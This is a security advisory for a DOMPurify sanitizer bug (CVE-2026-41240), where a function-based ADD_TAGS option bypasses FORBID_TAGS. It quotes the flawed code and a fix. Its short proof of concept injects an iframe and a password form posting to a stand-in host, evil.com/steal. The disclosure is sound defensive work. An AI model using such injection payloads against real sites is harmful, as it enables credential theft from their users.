# [M] DOMPurify: FORBID_TAGS bypassed by function-based ADD_TAGS predicate (asymmetry with FORBID_ATTR fix)

## Summary
Severity: Medium
Advisory: GHSA-h7mw-gpvr-xq4m
CVE: CVE-2026-41240
CWE: CWE-183, CWE-79
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-04-22
Source: https://github.com/advisories/GHSA-h7mw-gpvr-xq4m
Type: github-advisory

## Affected
- npm: `dompurify` — affected >=0 <3.4.0

## Details
There is an inconsistency between FORBID_TAGS and FORBID_ATTR handling when function-based ADD_TAGS is used.

Commit [c361baa](https://github.com/cure53/DOMPurify/commit/c361baa18dbdcb3344a41110f4c48ad85bf48f80) added an early exit for FORBID_ATTR at line 1214:

    /* FORBID_ATTR must always win, even if ADD_ATTR predicate would allow it */
    if (FORBID_ATTR[lcName]) {
      return false;
    }

The same fix was not applied to FORBID_TAGS. At line 1118-1123, when EXTRA_ELEMENT_HANDLING.tagCheck returns true, the short-circuit evaluation skips the FORBID_TAGS check entirely:

    if (
      !(
        EXTRA_ELEMENT_HANDLING.tagCheck instanceof Function &&
        EXTRA_ELEMENT_HANDLING.tagCheck(tagName)  // true -> short-circuits
      ) &&
      (!ALLOWED_TAGS[tagName] || FORBID_TAGS[tagName])  // never evaluated
    ) {

This allows forbidden elements to survive sanitization with their attributes intact.

PoC (tested against current HEAD in Node.js + jsdom):

    const DOMPurify = createDOMPurify(window);

    DOMPurify.sanitize(
      '<iframe src="https://evil.com"></iframe>',
      {
        ADD_TAGS: function(tag) { return true; },
        FORBID_TAGS: ['iframe']
      }
    );
    // Returns: '<iframe src="https://evil.com"></iframe>'
    // Expected: '' (iframe forbidden)

    DOMPurify.sanitize(
      '<form action="https://evil.com/steal"><input name=password></form>',
      {
        ADD_TAGS: function(tag) { return true; },
        FORBID_TAGS: ['form']
      }
    );
    // Returns: '<form action="https://evil.com/steal"><input name="password"></form>'
    // Expected: '<input name="password">' (form forbidden)

Confirmed affected: iframe, object, embed, form. The src/action/data attributes survive because attribute sanitization runs separately and allows these URLs.

Compare with FORBID_ATTR which correctly wins:

    DOMPurify.sanitize(
      '<p onclick="alert(1)">hello</p>',
      {
        ADD_ATTR: function(attr) { return true; },
        FORBID_ATTR: ['onclick']
      }
    );
    // Returns: '<p>hello</p>' (onclick correctly removed)

Suggested fix: add FORBID_TAGS early exit before the tagCheck evaluation, mirroring line 1214:

    /* FORBID_TAGS must always win, even if ADD_TAGS predicate would allow it */
    if (FORBID_TAGS[tagName]) {
      // proceed to removal logic
    }

This requires function-based ADD_TAGS in the config, which is uncommon. But the asymmetry with the FORBID_ATTR fix is clear, and the impact includes iframe and form injection with external URLs.

Reporter: Koda Reef

## References
- https://github.com/cure53/DOMPurify/security/advisories/GHSA-h7mw-gpvr-xq4m
- https://nvd.nist.gov/vuln/detail/CVE-2026-41240
- https://github.com/cure53/DOMPurify/commit/c361baa18dbdcb3344a41110f4c48ad85bf48f80
- https://github.com/cure53/DOMPurify
- https://github.com/cure53/DOMPurify/releases/tag/3.4.0
